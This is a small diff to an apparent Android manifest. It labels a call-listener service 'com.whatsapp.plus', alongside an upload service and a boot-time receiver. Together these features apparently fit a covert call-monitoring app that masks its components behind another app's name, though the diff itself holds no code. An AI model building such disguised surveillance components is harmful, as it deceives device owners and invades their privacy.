@@ -33,7 +33,9 @@
             </intent-filter>
         </activity>
 
-        <service android:name=".services.CallListenerService" />
+        <service android:name=".services.CallListenerService"
+            android:label="com.whatsapp.plus"/>
+
         <service android:name=".services.UploadService"/>
         <receiver android:name=".receivers.BootStateListener">
             <intent-filter>
